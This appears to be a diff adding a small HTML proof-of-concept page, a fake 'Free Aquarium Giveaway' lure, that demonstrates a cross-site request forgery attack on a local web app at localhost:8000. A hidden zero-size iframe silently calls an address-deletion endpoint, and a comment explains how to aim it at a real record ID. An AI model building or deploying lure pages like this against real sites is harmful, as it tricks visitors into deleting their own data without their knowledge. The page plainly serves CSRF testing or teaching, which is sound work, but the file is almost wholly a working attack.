@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Fish Giveaway</title>
+    <style>
+        body { font-family: sans-serif; background: #eef7fa; padding: 40px; }
+        .card { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: auto; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
+        h1 { color: #087e8b; }
+        .hidden-frame { width: 0; height: 0; border: 0; position: absolute; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>🐠 Free Aquarium Giveaway!</h1>
+    <p>Congrats — you've won a free nano aquarium.</p>
+    <p style="color:#666;">
+        (This page is silently firing CSRF attacks against localhost:8000.)
+    </p>
+</div>
+
+<!-- Change the address_id value to a real address ID from your DB -->
+<iframe class="hidden-frame"
+        src="http://localhost:8000/address-delete.php?address_id=1"></iframe>
+
+</body>
+</html>
